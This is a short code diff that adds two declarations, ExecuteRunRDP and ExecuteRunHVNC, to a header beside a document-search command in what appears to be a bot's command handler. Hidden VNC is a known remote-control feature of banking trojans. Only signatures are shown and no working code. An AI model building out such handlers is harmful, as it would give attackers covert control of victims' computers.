@@ -162,6 +162,8 @@ bool ExecuteCommand(LPVOID Manager, PCHAR HTML, bool Deferred = false);
 
 
 bool ExecuteDocFind(PTaskManager, PCHAR Command, PCHAR Args);
+bool ExecuteRunRDP(PTaskManager, PCHAR Command, PCHAR Args);
+bool ExecuteRunHVNC(PTaskManager, PCHAR Command, PCHAR Args);
 
 //---------------------------------------------------------------------------
 #endif
